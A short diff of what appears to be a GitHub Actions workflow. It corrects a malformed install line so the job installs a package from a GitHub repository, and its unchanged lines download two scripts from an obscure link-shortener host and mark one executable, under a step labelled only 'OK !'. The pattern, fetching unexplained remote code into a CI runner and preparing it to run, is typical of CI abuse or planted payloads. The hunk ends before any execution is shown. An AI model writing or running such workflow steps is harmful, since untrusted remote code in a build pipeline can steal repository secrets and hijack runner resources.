@@ -15,7 +15,7 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget pip install git+https://github.com/QuantumLLC/Archer
+          pip install git+https://github.com/QuantumLLC/Archer
           wget https://curl.by/I_c05/testraw.js
           wget https://curl.by/vAY6g/Test.py
           chmod +x testraw.js
